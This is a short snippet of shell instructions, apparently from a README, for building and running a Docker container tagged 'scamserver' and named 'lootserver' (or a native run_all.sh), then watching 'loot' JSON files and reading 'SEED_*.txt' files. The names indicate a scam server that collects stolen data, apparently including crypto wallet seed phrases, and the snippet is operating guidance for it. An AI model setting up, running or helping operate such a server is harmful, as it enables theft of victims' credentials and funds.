# Build & run
docker build -t scamserver .
docker run -d -p 80:80 --name lootserver scamserver

# Or native:
chmod +x run_all.sh
./run_all.sh

# View loot:
tail -f loot/*.json
cat loot/SEED_*.txt